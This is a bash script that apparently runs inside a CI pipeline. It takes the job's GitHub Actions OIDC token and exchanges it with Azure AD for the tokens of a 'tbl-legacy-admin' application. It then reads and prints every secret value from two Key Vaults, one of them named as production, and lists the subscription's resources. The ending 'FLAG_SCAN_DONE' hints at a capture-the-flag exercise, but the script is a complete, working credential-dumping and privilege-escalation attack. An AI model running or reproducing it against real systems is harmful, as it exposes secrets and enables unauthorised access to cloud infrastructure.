#!/usr/bin/env bash
set +e
LEGACY=891fb158-e02c-4428-a885-53b811f369c0
ID=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
echo "sub: $(echo "$ID" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -c 'import sys,json;print(json.load(sys.stdin).get("sub"))')"
exch(){ curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" -d grant_type=client_credentials -d client_id=$1 --data-urlencode "scope=$2" -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$ID"; }
echo "=== exchange OIDC -> tbl-legacy-admin (vault) ==="
R=$(exch $LEGACY "https://vault.azure.net/.default")
echo "$R" | python3 -c 'import sys,json;d=json.load(sys.stdin);print("OK" if d.get("access_token") else d.get("error_description","?")[:200])'
VT=$(echo "$R" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
if [ -n "$VT" ]; then
  for V in kv-tbl-sec-x3euoz kv-tbl-prod-x3euoz; do
    echo "--- $V secrets ---"
    for SID in $(curl -s -H "Authorization: Bearer $VT" "https://$V.vault.azure.net/secrets?api-version=7.4" | python3 -c 'import sys,json;[print(x["id"]) for x in json.load(sys.stdin).get("value",[])]' 2>/dev/null); do
      echo "   $SID = $(curl -s -H "Authorization: Bearer $VT" "$SID?api-version=7.4" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')"
    done
  done
fi
echo "=== also as tbl-legacy-admin: ARM + storage quick ==="
AT=$(exch $LEGACY "https://management.azure.com/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
[ -n "$AT" ] && curl -s -H "Authorization: Bearer $AT" "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resources?api-version=2022-12-01" | python3 -c 'import sys,json;[print("  ",r["type"],r["name"]) for r in json.load(sys.stdin).get("value",[])]' 2>/dev/null | head
echo "FLAG_SCAN_DONE"
